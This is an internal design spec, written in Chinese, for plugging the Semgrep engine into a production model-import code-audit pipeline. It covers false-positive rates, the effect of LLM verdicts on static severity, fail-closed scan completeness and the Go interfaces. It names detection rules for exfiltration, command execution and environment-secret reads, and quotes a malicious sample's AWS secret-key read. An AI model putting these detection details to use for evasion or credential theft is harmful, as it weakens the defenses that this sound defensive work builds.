# Semgrep 引擎接入 TAA 生产审计链路 —— 设计规范 (Design Spec)

- **Date**: 2026-09-23
- **Spec Path**: `.claude/specs/2026-09-23-semgrep-engine-integration-design.md`
- **Status**: **设计待评审，未实施**。本规范是设计文档，写下时不改任何生产代码。
- **上游依赖**：
  - 证据：`.claude/specs/2026-09-22-semgrep-engine-noninferiority-evidence-design.md`（判定「通过」）
  - 证据报告：`models/audit/audit-results/engine-compare/REPORT.md`
  - 目标态：`.claude/specs/2026-09-17-semgrep-audit-engine-design.md`
  - 先例：`.claude/specs/2026-09-17-inference-engine-decoupling-security-protocol-design.md`
- **Scope**: Tier 1 静态层的引擎替换（`internal/codeaudit`）+ 部署面（镜像与规则文件）。**不含** Tier 2（LLM 仲裁）改动，**不含**目标态 4 阶流水线的完整实现。

---

## 1. 决策记录

以下三项由用户在 2026-09-23 通过选择项确定，是本规范的前提，**不在本规范内重新论证**：

| # | 决策项 | 选定 | 落点 |
|---|---|---|---|
| **D1** | 接入边界 | **Go 内 `exec` semgrep CLI**，复用评测侧 JSON 契约，改动限定在 `internal/codeaudit`；**不**采用独立扫描服务 | §6 |
| **D2** | semgrep 不可用时的行为 | **fail-closed 阻断**，结论标 `UNCERTAIN` | §8 |
| **D3** | 证据门槛 | **先建留出集并跑通，再接入生产** | §9 |
| **D4** | **部署拓扑** | **taa 与 semgrep 绑定部署在同一容器；LLM 单独部署。** 同容器内存争用按**拓扑**消除，不按「接受风险」处理 | §5 |

被否选项：D1 的「独立扫描服务」（本次不采纳）；D3 的「先接入、证据后补」。

### 1.1 D4 的地位：它解掉的是 §5 的冲突，不是 §5 的风险

D4 由用户于 2026-09-23 指定，**先于本规范的 §5 写成**。因此 §5 的写法从「冲突 + 缓解条件 + 残余风险待裁决」改为「冲突已被部署拓扑消除 + 测试期仍暴露 + 哪些故障通道与拓扑无关」。

**关键区分（写进 D4 的适用范围，不可含糊）**：把 LLM 挪出容器**只**消除**资源争用类**失效，**不**消除**模型行为类**失效。已实测的两个 fail-closed 通道分属两类：

| 通道 | 实测事件数 | 与拓扑的关系 |
|---|---|---|
| `llm_unavailable`（撞 60 s `urlopen` 上限） | 2 / 468 | **拓扑引起**。同机 semgrep 全量扫描 → 内存压力 → 推理停摆。**D4 消除它** |
| `parse_error`（回复 JSON 未转义内引号） | 14 / 468 | **拓扑无关**。模型行为，与内存、与 semgrep 均无关。**D4 消除不了，接入后仍然存在** |

**因此 D4 不是「问题已解决」的通行证**：§8 的 fail-closed 契约对两类通道**同等必需**，`parse_error` 在 D4 之后仍是常态化事件（六轮中 14 次）。任何「LLM 单独部署了，所以不用担心」的读法都是错的。

---

## 2. 这次接入买到什么、不买到什么

**必须先说清楚，否则接入会被误读成检测能力提升。**

### 2.1 不买到：检测能力

证据报告 §7.3 记录，P0-bis 已把两臂的 `rule_id` 集合差异**从 30/50、44/100 有意归零至 0**；报告 §4 的三对不一致清单**均为空**。也就是说：

> **当前 semgrep 规则集是 Go regex 基线的镜像。** 在两个引擎上跑同一批规则，得到的判定逐样本相同——这**正是**非劣性判定「通过」的含义，也**正是**它不构成能力提升的原因。

代价却是实测的：扫描 **0.009 → 4.343 s/样本（≈483×）**，整轮 **+614.1 s（+53%）**（报告 §2）。

### 2.2 买到：能力的前置条件

目标态架构（2026-09-17）要的四项能力——别名归一化、跨行污点、AST 作用域切片、多语言——**regex 引擎在结构上不可能提供**。接入 semgrep 是拿到这些能力的**必要前置**，其价值兑现发生在**接入之后**的规则演进里，而不是接入这一刻。

**本规范因此把「接入」定义为一次行为中性的引擎替换**：接入后生产判定应当**与接入前逐样本相同**（这正是留出集要验证的，§9）。任何检测能力变化都必须走**接入之后**的独立证据流程，不得夹带在接入里。

> **推论（须写进评审结论）**：若组织当前**不需要** §2.2 的能力，则本次接入是**净成本**，不应做。

### 2.3 证据的适用边界（不得扩大）

| 证据支持的 | 证据**不**支持的 |
|---|---|
| ~~在 `audit-100` 上两臂判定逐样本相同，3 次重复稳定~~ **→ 限定为：在 `gate` 策略下逐样本相同，3 次重复稳定** | 「semgrep 可安全替换生产 regex」（`audit-100` 是**拟合集**，报告 §7.2） |
| 规则级一致性未被下游放大成判定级差异 | 「纯换引擎」的因果结论（证据只支持**整包替换**，报告 §7.1） |
| 六轮 `scan_incomplete_count = 0` | 未参与对齐的代码上的行为 |
| —（**证据反而反对**）| **生产默认策略（`assist`）下的非劣性**：同一批样本上三对 `ΔFPR = +0.04` 同向，按 0 容差为 FAIL（报告 §7.13、本规范 §3.2.2） |
| —（**证据反而反对**）| 「两臂给 LLM 的证据形态相同」：实际不同，且这是判定差异的成因（同上） |

---

## 3. 生产现状：接入面（已逐条核实）

### 3.1 扫描入口

`DefaultScanner()` 有**三个**调用点，实际只有**一个**是生产活跃路径：

| 位置 | 所在函数 | 生产状态 |
|---|---|---|
| `verifier.go:300` | `GenerateAuditReport` Phase 1 | ✅ **唯一活跃接缝**（经 `import_processing.go:632`、`coordinator/flow_model.go:87` 到达） |
| `verifier.go:187` | `CheckImportWithLLM` | ⚠️ 仅被 `llm_test.go` 引用，生产无调用者 |
| `scanner.go:210` | `CheckImport` | ⚠️ 全仓无调用者（含测试） |

三者都收敛到 `DefaultScanner().ScanDirectory*`，所以引擎替换可以只改这一处收敛点，但**后两个导出函数必须一并处理或明确弃用**——否则它们会静默继续用 regex，而名字看起来仍在工作。

### 3.2 生产消费哪一行（本项目已在此处犯过两次错）

`import_processing.go:645` 取 `audit.Conclusion.Passed`，其定义在 `audit.go:283-295`：

```go
switch policy {
case "gate":
    passed = stats.High == 0 && stats.Medium == 0   // MEDIUM 也拦截
default:
    passed = stats.High == 0                        // 只拦 HIGH
}
if ctx.ScanPassed != nil && !*ctx.ScanPassed { passed = false }
```

- 生产**默认策略是 `assist`**（`config.go:254`），不是 `gate`。
- `config.go:197-207` 已实现 `llm.policy` 的 fail-fast，只接受 `{"assist","gate"}`。
- **判定是「存在性」的**：只看 `High == 0` / `Medium == 0`，与 finding **条数无关**。这条性质在 §7.4 有用。

### 3.2.1 **`stats` 不来自 `Finding.Severity`——LLM 裁决会覆盖静态严重度**（本规范初稿遗漏，2026-09-23 实测补入）

`ComputeStatistics`（`audit.go:234-253`）**不直接读 `Finding.Severity`**，而是逐条调用 `ClassifyFindingRisk`（`audit.go:191-231`）：

```go
func ClassifyFindingRisk(f Finding) string {
    switch strings.ToUpper(strings.TrimSpace(f.LLMRisk)) {
    case "HIGH", "CRITICAL": return "HIGH"     // 实测：llm_risk 恒为中文句子，此分支为死代码
    case "MEDIUM":           return "MEDIUM"
    case "LOW", "NONE":      return "LOW"
    }
    switch strings.ToUpper(strings.TrimSpace(f.LLMVerdict)) {
    case "MALICIOUS":  return "HIGH"           // ← 覆盖静态严重度：MEDIUM 命中可变成 HIGH
    case "SUSPICIOUS": return "MEDIUM"
    case "BENIGN":     return "LOW"
    case "UNCERTAIN":
        if f.Severity == SeverityHigh { return "HIGH" }
        if f.RuleID == "EMB_003" || isTestFile(f.File) { return "LOW" }
        return "MEDIUM"
    }
    switch f.Severity { /* 无裁决时：HIGH→HIGH，MEDIUM→MEDIUM（EMB_003/测试文件豁免），其余→LOW */ }
}
```

**三条必须写进设计的前提**：

1. **一条静态 MEDIUM 命中，只要 LLM 判 `MALICIOUS`，分类结果就是 HIGH，在 `assist`（生产默认）下会被拦截。** 反之，静态 HIGH 被 LLM 判 `SUSPICIOUS` 则降为 MEDIUM，`assist` 下**不拦**。
2. **因此「改静态 severity」的后果比直觉小得多**：静态严重度只在**无裁决**或裁决为 `UNCERTAIN` 时才起作用。实测 `audit-100` 六轮中 **16 个 `UNCERTAIN` 发现全部已是静态 HIGH**，故把 `DYN_001`/`FIL_001` 由 MEDIUM 升为 HIGH 在**本语料上零影响**；只有在 **LLM 关闭或整体不可用**时才有实际影响。
3. **`gate` 与 `assist` 对「什么会拦」的定义不同，而这正是证据适用性的边界**（见 §3.2.2）。

`Findings` 的**条数**对判定中性（§3.2 末条），但**每条的裁决**不是——这是本规范初稿把「存在性判定」误读成「所有 finding 等价」的地方。

### 3.2.2 **证据只在 `gate` 下成立，而生产默认是 `assist`**（2026-09-23 实测，最要紧的一条）

非劣性证据是用 `--policy gate` 采集与判定的。`gate` 拦任何**非 `BENIGN`** 裁决（六轮 600 份报告中 `BENIGN` 出现 **0 次**），**故它对裁决失明**；而两臂真正的差异**全在裁决里**。实测（`production-gate-semantics.json`，复跑 `TAA_PRODUCTION_GATE=1 go test ./internal/codeaudit/ -run TestProductionGateSemantics -v`）：

| 策略 | regex FPR / recall | semgrep FPR / recall | ΔFPR |
|---|---|---|---|
| `gate`（本轮采集所用） | 0.5600 / 1.0000 | 0.5600 / 1.0000 | **0.0000** ✅ |
| **`assist`（生产默认）** | **0.5200** / 1.0000 | **0.5600** / 1.0000 | **+0.0400** ❌ |

三对配对**全部**为 `+0.04`、方向一致，由 `B3-04`/`B3-09` 驱动：同一 `ENV_001`、同一行、`code_snippet` 逐字节相同，仅因两臂喂给 LLM 的**上下文形态**不同（regex 给 ±N 行窗口，semgrep 给 `ast_enclosing_block`，见 `code_security_analyzer.py:529-536`），LLM 裁决从 `SUSPICIOUS` 翻为 `MALICIOUS` → 分类 HIGH → `assist` 下开始拦截（6/6 轮稳定，非噪声）。完整机制见证据报告 §7.13。

**该 ΔFPR 按通道分解后，性质更明确（证据报告 §7.14）**：把被拦的良性样本按「有无静态 HIGH」与「有无 `MALICIOUS` 裁决」切成互斥两桶——

| 通道 | regex | semgrep | Δ |
|---|---|---|---|
| Tier 1 静态 `HIGH` 落在良性样本 | 6（`B4-01/02/05/06/07/10`） | **同一批 6 个** | **0** |
| Tier 2 升级（静态无 HIGH） | 20 | 22（多 `B3-04`,`B3-09`） | +2 |
| 合计 FPR | 0.52 | 0.56 | +0.04 |

**两个引擎在良性样本上的静态误报逐样本相同，差值为 0。** 所以：**(a)** ΔFPR 不是检出质量差异，全部经由「上下文形态 → 裁决 → 升级」；**(b)** 两臂共用的 Tier 2 升级通道占了误报的 77%/79%（regex 26 例中 20 例），Tier 1 自身只占 0.12。

> **因此接入 semgrep 不应被期待降低整体误报**——它当前的可归因净效应是把 `assist` 下的 FPR 从 0.52 推到 0.56。想压 FPR，杠杆在 Tier 2 的升级规则，不在 Tier 1 换引擎。

**对本规范的直接后果**：

1. **按 D3 的 0 容差，在生产默认策略下，本次接入的准入证据不成立。** 这不是说证据错了——`gate` 下的 Δ=0 是实测的、真实的——而是说**它回答的不是生产要问的问题**。
2. **§9 的留出集必须在 `assist` 下判定**（原规格未指定策略，现补为硬性要求），且**必须专门比对两臂的上下文构造**，因为差异就是从这里来的。
3. **这是 D1 实现里一个具体的、可验证的实施要求**：Go 侧 `semgrepEngine` 构造 `ContextBefore`/`ContextAfter`/`CPGEvidence` 的方式，**必须使生产 Prompt 与 regex 臂等价**，否则在生产默认策略下就会复现这个 +0.04。**该要求的实测代价已知：约 +0.04 FPR（三对一致）**，可作为 §6.4 那条测试的验收阈值。§6.4 据此新增一条要求。

### 3.3 潜伏缺陷（接入必须处理）

`verifier.go:160-178` 的 `recalculatePassed` 注释自称 gate 分支，实现却是 `report.Passed = highCount == 0`——**MEDIUM 不拦截**，与 `audit.go` 的 gate 语义相反。因为生产消费 `audit.go` 的值，该分歧目前被遮蔽；但同一个字符串 `"gate"` 在同一个包里有两种含义。`recalculateStaticPassed`（`verifier.go:232-246`）是第三处相同写法。

### 3.4 已有的、可直接复用的接缝

| 接缝 | 位置 | 价值 |
|---|---|---|
| `Finding.CPGEvidence` | `rules.go:40`；被 `verifier.go:48-51` 用于**覆盖** `ContextAfter` | ✅ **现成的证据注入点**：把 AST 切片/污点轨迹塞进这个字符串即可进入 LLM Prompt，**无需改 TEE-LLM 协议** |
| `Finding.TaintTrace []TaintStep` | `rules.go:41`（类型在 `rules.go:14-23`） | ⚠️ 类型已定义，但**未进入** `teellm.FindingPayload`/`CodeTarget`（`teellm/types.go:52-68`）。结构化污点要真正到达 LLM 需扩协议 |
| `ConclusionContext.ScanPassed *bool` | `audit.go:259`、`:293` | ✅ **现成的 fail-closed 通道**：置 `false` 会强制 `passed = false`，**两种策略下都生效**。D2 直接落在这里 |
| 规则 YAML 已 force-track | `models/audit/semgrep/rules/{python,go,shell}/rules.yaml` | ✅ 可部署（`models/` 被 gitignore，这三个文件是 `-f` 加进去的） |

### 3.5 现存缺陷：`MaxFindings` 静默截断

`scanner.go:96-99` 与 `:280-283`：命中数达 `MaxFindings`（默认 200）时 `findings = findings[:MaxFindings]` 并 `filepath.SkipAll`。**`buildReport` 不记录任何「已截断」标志**，`Report.FilesCount` 只是走到一半的文件数。

后果：**第 200 条之后的 HIGH 命中会被丢掉，`passed` 可能因此为 `true`。** 这是当前 regex 引擎里一条真实存在的**静默放行**通道，且目标态架构 §8.1 要求的 `scan_complete == true` 前置条件在生产里**根本没有对应字段**。

### 3.6 已修复的缺陷：`ENV_001` 大小写，以及「证据臂 == 生产引擎」这一前提的实测（2026-09-23）

**本规范 §3.2.2 与证据报告的全部数值，都依赖一个此前未检验的前提**：证据的 "regex 臂"（Python `models/examples/code_security_analyzer.py`）与生产 Tier 1（Go `internal/codeaudit`）是同一个扫描器。两份规则表各自维护，可以漂移。

实测（`TAA_CORPUS_PARITY=1 go test ./internal/codeaudit/ -run TestGoEngineMatchesBenchmarkRegexArm`，用生产 Go 引擎重扫语料并与 regex 臂产物逐样本比对）：**修复前 92/100 一致，8 处分歧**，全部为同一条规则的同一方向——`ENV_001/MEDIUM` 在 Python 有、Go 没有。

**根因**：Go 的 `ENV_001` 三条模式未加 `(?i)`（Python 版有，且 `tests/test_code_security_analyzer_v2.py:81` 专门守着）。备选词全为小写，**大写变量名一个都不匹配**。后果分两侧，且都是「唯一 finding 就是它」的样本：

- `B3-02/04/07/09`（良性）：Go 产出 **0** finding → 修复前生产误报**低于**基线；
- `M3-01/03/06/08`（**恶意**）：Go 产出 **0** finding → 修复前生产**漏报**。`M3` 家族的恶意行为就是大写密钥读取（`os.getenv("AWS_SECRET_ACCESS_KEY", "")`）。

**已修复**（TDD，先 RED 再加 `(?i)`），修复后**100/100 一致（含行号）**。这是一条**先于 semgrep、与 semgrep 无关**的生产缺陷，且它使生产静态输出与证据基线**逐字节等价**——从此 §3.2.2 的数字是**实测可迁移**的，不再是「两份表应该一致」的假设。

**对 D1 的直接影响**：`semgrepEngine` 的规则集必须以**修复后**的 Go 规则为准对齐，否则同样的漂移会以相反方向重演。§9.2 据此新增一条前置要求。

**顺带测出（潜在，非本轮成因）**：semgrep 侧 `taa-env-secret-python`（`rules.yaml:136`）**不按 key 名过滤**，任何环境变量访问都命中，比两个 regex 臂都宽。实测其在本语料上的后果为**良性 0/50、恶意 0/50**——语料里每个 env 访问的 key 都含密钥词，过宽从未真正触发。**它是一条真实的规则等价性缺口，但不是 ΔFPR 的成因**；§7.13/§7.14 的归因（上下文形态）不受影响。D1 实施时须决定是收窄该规则还是接受它（收窄会影响 ENV_001 的召回边界）。

> 接入 spec 必须顺带修掉它：`Report` 增加 `Truncated bool`，截断即视为 `scan_complete = false`。

### 3.7 规则集现状

生产 Go：**13 条**，`rules.go:69-221`，`Severity` 只有 HIGH/MEDIUM 两个常量（`rules.go:9-10`）。

| 严重度 | 条数 | 规则 ID |
|---|---|---|
| HIGH | 9 | `NET_001` `NET_002` `CMD_001` `OBF_001` `PER_001` `EXF_001` `EMB_001` `EMB_002` `EMB_004` |
| MEDIUM | 4 | `DYN_001` `FIL_001` `ENV_001` `EMB_003` |

线上 semgrep 规则：`python/rules.yaml` **13 条**，id 形如 `taa-<family>-python`，`metadata.rule_family` 回指 Go 的规则 ID。严重度用的是 semgrep 自己的词汇（ERROR/WARNING）。

---

## 4. **新事实**：semgrep 不在容器里（需裁决）

这是选定 D1 时**尚未核实**的一项，落地前必须解决。

| 事实 | 证据 |
|---|---|
| TAA 守护进程跑在容器**内部** | `deploy-docker.sh:426` `docker exec -d … nohup bash ./start.sh`；容器内 `/root/taa/taa`（20 MB，可执行） |
| 容器内**没有** semgrep | `docker exec taa-env-slim-v2 sh -lc 'command -v semgrep'` → 无；`import semgrep` → `ModuleNotFoundError` |
| 宿主**有** semgrep 1.177.0 | `/home/hjy/.local/bin/semgrep` |
| 可部署镜像是**从运行中的容器 commit** 出来的 | `deploy-docker.sh:2` "Package a deployable TAA + TEE-LLM image from the local development container" |
| 容器里没有 pip 包，但**有** `pip3` 24.0 / Python 3.12.3 | 实测 |

**因此「Go 内 exec semgrep CLI」隐含一个 D1 未覆盖的子决策**：semgrep 必须以某种方式进入容器。

| 选项 | 做法 | 代价 |
|---|---|---|
| **(a) 装进镜像** | 容器内 `pip3 install semgrep==1.177.0`，随镜像冻结 | 可部署产物变大；供应链面扩大；**对平台上报的度量值的影响未经核实**（见下） |
| **(b) 绑定宿主 semgrep** | 容器挂载宿主二进制 | 与「镜像自包含」矛盾；宿主路径/版本成为隐含依赖；`--network host` 是网络而非文件系统 |
| **(c) 宿主侧 exec** | 守护进程经某个本地接口请宿主跑 semgrep | **实质退回被否的「独立扫描服务」**，与 D1 不符 |

**推荐 (a)**，理由：只有 (a) 与「镜像自包含、可在 TEE 内复现」一致，且版本可 pin。

**用户已于 2026-09-23 指定实施顺序（§10），本子决策随之定为 (a)**：代码在本地接好之后，用 `deploy-docker.sh` 把 taa + semgrep 一起部署进容器做测试。

> ⚠️ **未核实、不得声称**：`internal/platform/register.go:29` 会把 TEE attestation report 上报给控制平台；`LLMExpectedMeasurements`（`config.go:159`）是**对端** TEE-LLM 的度量白名单，**不是**本镜像的。**往镜像里加 semgrep 是否改变平台侧校验的本机度量，本规范不掌握证据。**
>
> 该问题**已降级**：它只在**正式发布镜像**时才需要答案，容器内的功能测试不受阻塞（§12.2 Q1）。但在核实之前，不得在任何文档里声称「接入不影响度量」。

---

## 5. D1 与 2026-09-17 解耦规范的冲突：由 D4 消除，测试期仍暴露

D1 已定，本规范不重新论证，但**必须记录冲突的形状、它被什么消除、以及什么没被消除**，否则等于假装冲突不存在。

**冲突的形状**：解耦规范之所以存在，是因为「大模型推理出现 GPU 显存溢出 (OOM)、死锁或内存泄漏时，将直接拖垮 TAA 核心证明与任务协调守护进程」。而 `exec` 把 semgrep 放进**守护进程自己的进程树**，也就放进了**同一个容器**——与 2026-09-17 要修的失效模式同构。

**且这个失效模式在本项目已被实测两次**（证据报告 §7.6、§9.10 第 11 条）：

| 观测 | 数据 |
|---|---|
| 全量 semgrep 扫描 + 容器内 ollama 并发 | 容器 `Exited (137)`（OOM） |
| 六轮采集中的一次（未被 OOM 杀，但推理停摆） | 容器存活、`RestartCount=0`，**2 次调用撞上 60 s `urlopen` 上限**（91.7 s / 120.1 s，当轮成功调用中位数 12.2 s） |
| 该轮恰是扫描成本最高的一轮 | — |

### 5.0 D4：冲突由部署拓扑消除

**D4（用户 2026-09-23 指定）：正式部署时 `taa + semgrep` 绑定在同一容器，LLM 单独部署。**

争用之所以存在，是因为 semgrep 与 ollama 在**同一个 9.703 GiB 的内存域**内（`deploy-docker.sh` 启动的 `taa-env-slim-v2`，`--network host`）。把两者分开部署即**从拓扑上**取消了这个内存域——不是「测量后认为可以接受」，而是**冲突的成因不再成立**。这比「接受风险」强，也比任何 §5.1 式的缓解措施可靠：缓解措施是**约定**（人可能违反），拓扑是**约束**（配置违反不了）。

**因此 2026-09-17 解耦规范与 D1 的张力在正式部署形态下消解**：解耦规范要保护的是「守护进程不被推理拖垮」，D4 让 semgrep 留在守护进程侧而推理出走，正是该规范的同向做法。

**但 D4 只消除资源争用类失效，不消除模型行为类失效**（见 §1.1 的两通道表）。`parse_error`（14/468，模型把 `code_snippet` 原样写进 JSON 的 `reason` 而不转义内引号）与内存、与 semgrep、与容器拓扑**全都无关**，接入后仍将常态发生。**D4 之后 §8 的 fail-closed 契约一字不减。**

**测试期仍然暴露**：阶段 G 按用户指定的顺序，把 **taa + semgrep 一起**部署进容器做功能测试，而该容器里**也有 ollama**——即阶段 G 的拓扑**就是**冲突形态本身。故 §5.1 的全部要求对阶段 G **仍然有效**，D4 只解除了**正式部署**的冲突。

> ⚠️ **阶段 G 的判据须重新表述**：既然 D4 已把正式部署的争用消除，阶段 G 的容器压测**不再用于裁决「是否接受风险」**（该问题已被 D4 关闭），而是用于**验证 D4 的边界**——即确认「同容器并发确实会饿死推理」这一实测结论，从而为**正式部署必须分离 LLM** 提供直接证据。阶段 G 若发现同容器并发无影响，**不构成放松 D4 的理由**（一次负载下的观测不能推翻两次既有实测）。

### 5.1 测试期缓解条件（阶段 G 仍适用；正式部署由 D4 取代）

**结论：semgrep 会饿死同机 LLM，这是实测而非推测。** 容器总内存 9.703 GiB，ollama 与（未来的）semgrep 同处其中。以下为**实施要求，非建议**：

1. **扫描与 LLM 仲裁不得并发。** 4 阶流水线的 Phase 1（扫描）与 Phase 2/3（LLM）在 `GenerateAuditReport` 里本来就是顺序的——这是幸运，不是设计。实施时必须**显式保证**它不被改成并发。
2. **扫描进程必须有内存上限与硬超时。** `semgrep_runner.py:179` 用 `timeout=120`（评测侧）；生产侧须单独定值并**在超时后走 fail-closed**（§8），不得当作「无命中」。
3. **扫描期间不得有第二个重内存任务。** 部署文档须写明。
4. **留出集验证必须包含「扫描 + LLM 同时受载」的场景**（§9），因为评测矩阵是串行的，**没有覆盖**这个组合。

> **本条的裁决依据原为阶段 G 的容器压测，现已由 D4 取代**（§5.0）。阶段 G 仍按下列要求执行，但其结论**不再用于回答「是否接受同容器争用」**（D4 已从拓扑上关闭该问题），而是用于**取得「必须分离部署」的直接证据**。判据仍是逐样本 `llm_state` 与调用耗时，**不是**容器存活（容器活着而推理停摆是已证实的形态）。
>
> **D1 的独立服务出口不再作为争用的出路**：争用已由 D4 消除，把 D1 改成独立服务是**另一件事**（它会同时改掉 §6 的接口形态与 §11 的回滚面），本规范不因争用而采纳它。

---

## 6. 接口设计（Go 侧）

### 6.1 引擎抽象

引入一个最小接口，让两个引擎同形，并使「选择哪个引擎」成为**一处**可配置、可回滚的决策：

```go
// internal/codeaudit/engine.go
//
// StaticEngine is the Tier 1 static scanning boundary. Two implementations
// exist: the regex baseline (Scanner) and the Semgrep CLI adapter.
type StaticEngine interface {
    ScanDirectory(dir string) (*Report, error)
    ScanDirectoryWithLines(dir string) (*Report, map[string]int, error)
    // Name reports the engine identity written into Report.Engine.
    Name() string
}
```

- `regexEngine` —— 包住现有 `*Scanner`，**行为零变化**。
- `semgrepEngine` —— 新增，`exec` semgrep CLI 并解析其 JSON。
- 选择由 `DefaultEngine()` 单点决定，落在 `LLMConfig` 之外的新 `EngineConfig`（`internal/codeaudit` 或 `internal/config`，见 §6.5）。
- `verifier.go:300` 与 `verifier.go:187`、`scanner.go:210` 三处统一改为经 `DefaultEngine()`。

**`Name()` 存在的理由**：报告必须能自证是哪个引擎产出的。P4（`generate_matrix_results.py` 的 `engine` 字段由 mode 名推断）已经因为「字段只写不读、唯一作用是被人引用」被修过一次；同样的错误不能再犯。

### 6.2 `Report` 的字段扩展

目标态 §8.1 的四条前置条件在生产里没有对应字段，必须补：

```go
type Report struct {
    // ... 既有字段不变 ...

    Engine         string `json:"engine"`                    // "regex" | "semgrep"
    EngineVersion  string `json:"engine_version,omitempty"`  // semgrep --version 的输出
    ScanComplete   bool   `json:"scan_complete"`             // §8.1 第 1 条
    ParserErrors   int    `json:"parser_errors"`             // §8.1 第 2 条
    Truncated      bool   `json:"truncated"`                 // 命中数触顶，见 §3.5
    UnsupportedExts int   `json:"unsupported_extensions"`    // §8.1 第 3 条
    ProcessExitCode int   `json:"process_exit_code"`         // §8.1 第 4 条
}
```

**兼容性**：`ScanComplete` 为 `false` 的零值语义是危险的——`regexEngine` 必须**显式**置 `true`（regex 是同步纯内存匹配，不存在「扫描未完成」状态，与评测侧 P2 对 regex 臂的处理一致）。Go 的零值 `false` 会让「忘了赋值」看起来像「扫描失败」，方向安全，但仍须显式赋值并有测试守住。

### 6.3 `Finding` 的字段扩展

```go
EngineRuleID string `json:"engine_rule_id,omitempty"` // semgrep 的 check_id，如 taa-cmd-exec-python
RuleFamily   string `json:"rule_family,omitempty"`    // 回指的 TAA 规则 ID，如 CMD_001
```

`RuleID` **保持**为 TAA 规则 ID（`CMD_001`），使下游（`BuildFileReport`、`SuggestionForRule`、`projectCodeAuditSection`、TEE-LLM 的 `RuleID`）**无需改动**。这是让接入保持行为中性的关键选择：`metadata.rule_family` 是映射的唯一来源。

### 6.4 规则集与路径

- Go 侧不内嵌规则：`exec` semgrep 时 `--config <RulesDir>`，`RulesDir` 随镜像部署。
- 规则文件来源是仓库里已 force-track 的 `models/audit/semgrep/rules/`；镜像内落点须在 §11 的实施项中固定，并**与评测侧 `semgrep_runner.py` 指向同一份内容**（否则评测证据与生产规则不再对应）。
- 本轮**只启用 `python/rules.yaml`**：生产 `DefaultConfig().Extensions = []string{".py"}`。`go/`、`shell/` 三份规则存在但不是本次范围（§13）。
- 命令形状复用评测侧契约（`semgrep_runner.py:187-202`），但**目标形式必须偏离**（2026-09-23 实测，见下）：
  ```
  semgrep scan --config <RULES> --json --quiet --disable-version-check --no-git-ignore \
          <file1> <file2> …            # 显式文件列表，不是 <target_dir>
  ```
  注意 `--no-git-ignore`：生产必须扫到被 `.gitignore` 排除的文件（那正是攻击者会放东西的地方）。

- **【偏离，硬性】传显式文件列表而非目录。** §6.4 初稿沿用评测侧的 `--include '*.<ext>' <target_dir>`，实测不可用：目录 target 下 semgrep **会进入 `venv/` 与 `__pycache__/`**（`--no-git-ignore` 关掉的是 `.gitignore`，不是 `SkipDirs`），而 regex 臂按 `Config.SkipDirs` 跳过它们。用目录就等于两臂扫的不是同一批文件，§6.4 的上下文等价与 §9 的非劣判定都失去前提。
  因此 `semgrepEngine` 自己走一遍 `walkTargets`，把结果**显式作为 target 传入**；文件集由 walk 决定，与 semgrep 的忽略规则无关。实测（`TestSemgrepEngineAgreesWithTheRegexArmOnTheFileSet`）：两臂 `FilesCount` 相同，`venv/`、`__pycache__/`、`.txt` 中的 finding 为零。
  > walk 的**策略**与 regex 臂共用同一份 `Config`（`SkipDirs`/`Extensions` 是配置的唯一来源，加一个跳过目录两臂同时生效），**机制**则刻意不复用：regex 臂的 walk 在命中 `MaxFindings` 时提前 `SkipAll`，而「扫了哪些文件取决于已发现多少 finding」的基线不该被任何测量引用。
  **对已有证据的影响：已核，为零。** 评测侧 `semgrep_runner.py` 传的是目录 target，故曾需确认它是否扫了 regex 臂跳过的目录。实测 `audit-100` 下的 `__pycache__`（共 10 处，如 `p4_bert_sentiment/B2-08/__pycache__`）**只含 `.pyc`**，而 runner 传了 `--include '*.py'`，因此评测 semgrep 臂与 regex 臂扫的是同一批 `.py`。**结论：证据无需重做**；但危险是真实的而非理论的——模型导入目录里带 `venv/*.py` 完全正常，那正是显式 target 要挡的情形。
  另注：`--config` 传目录时 semgrep 会把 `check_id` 前缀成规则文件的点分路径（实测 `models.audit.semgrep.rules.python.taa-env-secret-python`），落点一变标识就变，故 `Finding.EngineRuleID` 取**末段**（`taa-env-secret-python`），与 §6.3 的例子一致。

- **【新增，硬性】完整性必须在报告产生之前成立。** 实测（semgrep 1.177.0）：**传一个不存在的 target，semgrep 返回 `results: []`、`errors: [SemgrepError]`，退出码 0**；正常命中与零命中**退出码都是 0**；被扫文件有语法错误时 `errors` 仍为空。结论是退出码不能作为完整性信号，而只读 `results` 的实现会把「从未读过」报告成「干净」。三项判据缺一不可：
  1. `errors` 非空 → 失败（这是唯一能捕获「目标不可读导致空结果」的信号）；
  2. `paths.scanned` 必须覆盖**全部**传入 target → 否则失败（正因为 target 是显式传入的，这个集合是已知的，「看了没有」才能区别于「没看」）；
  3. 退出码非 0、输出无法解析、进程起不来 → 失败。
  失败一律以 **error 返回，不返回报告**（`ScanDirectory` 返回 `nil, err`）：一份存在的报告迟早会被下游读成判定。故 `semgrepEngine` 返回的每一份报告 `ScanComplete` 都是 true——`false` 那条路已经变成 error 了。这与 regex 臂（恒为 `true`）在字面上一致，但含义更强：它是**判据通过**的结果，不是零值。
  已由测试守住：`TestSemgrepEngineTreatsErrorsAsIncomplete`、`…TreatsUnscannedTargetAsIncomplete`、`…RejectsNonZeroExit`、`…RejectsUnparseableOutput`、`…RejectsUnrunnableProcess`，反向由 `…MarksCleanScanComplete` 守住（防止「永远失败」也能满足上述断言）。

- **【新增，硬性】严重度、`Category`、`Description` 一律取自生产规则表**，键为 semgrep 规则的 `metadata.rule_family`，**不读** semgrep 的 `extra.severity`。§7.1 已指出 ERROR/WARNING→HIGH/MEDIUM 在现行 13 条上是巧合；巧合意味着在本语料上**读错源也看不出来**，所以测试用**注入的规则表**制造分歧来钉（`TestSemgrepEngineReadsSeverityFromTheProductionRuleTable`：表里把 `ENV_001` 标成 HIGH，而载荷里 semgrep 说 WARNING，读错源即失败）。同理 `RuleFamily` 未知或缺失必须 fail-fast（`TestSemgrepEngineRejectsUnknownRuleFamily`、`…RejectsMissingRuleFamily`），且**一次报出全部**未映射项，而不是每次运行报一条。

- **【新增】注释行的等价是「机制巧合」，须有测试守住。** regex 臂跳过 trim 后以 `#` 开头的行；semgrep 得到同样结果走的是另一条路——13 条规则**全是 AST 级 `pattern`**，注释不在 AST 里。两条路今天结果一致，但若将来有规则改用 `pattern-regex`，`semgrepEngine` 就会开始报出 regex 臂不报的注释代码。`TestSemgrepEngineSkipsCommentLinesLikeTheRegexArm` 就是为此存在；**不为此加冗余的注释过滤**，因为那会掩盖真正的分歧信号。

